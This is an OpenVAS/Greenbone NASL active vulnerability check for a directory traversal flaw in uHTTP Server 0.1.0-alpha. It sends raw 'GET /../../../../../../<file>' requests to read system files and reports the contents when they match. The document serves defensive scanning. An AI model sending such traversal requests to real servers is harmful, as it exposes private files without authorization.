# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100560");
  script_version("2021-10-29T09:07:48+0000");
  script_tag(name:"last_modification", value:"2021-10-29 09:07:48 +0000 (Fri, 29 Oct 2021)");
  script_tag(name:"creation_date", value:"2010-03-30 12:13:57 +0200 (Tue, 30 Mar 2010)");
  script_tag(name:"cvss_base", value:"5.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("uHTTP Server <= 0.1.0-alpha Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("uhttps/banner");

  script_tag(name:"summary", value:"uHTTP Server is prone to a directory traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting this issue will allow an attacker to view arbitrary
  local files and directories within the context of the webserver. Information harvested may aid in
  launching further attacks.");

  script_tag(name:"affected", value:"uHTTP Server 0.1.0-alpha is vulnerable. Other versions may
  also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38986");
  script_xref(name:"URL", value:"http://www.salvatorefresta.net/files/adv/uhttp%20Server%200.1.0%20alpha%20Path%20Traversal%20Vulnerability-10032010.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 8080);

banner = http_get_remote_headers(port: port);
if (!banner || "Server: uhttps" >!< banner)
  exit(0);

files = traversal_files("linux");

soc = open_sock_tcp(port);
if (!soc)
  exit(0);

foreach pattern (keys(files)) {
  file = files[pattern];

  req = 'GET /../../../../../../' + file + ' HTTP/1.0\r\n\r\n';
  send(socket: soc, data: req);
  res = recv(socket: soc, length: 2048);

  if (egrep(pattern: pattern, string: res, icase: TRUE)) {
    report = 'It was possible to read "' + file + '".\n\nResult:\n\n' + res;
    security_message(port: port, data: report);
    close(soc);
    exit(0);
  }
}

close(soc);

exit(99);
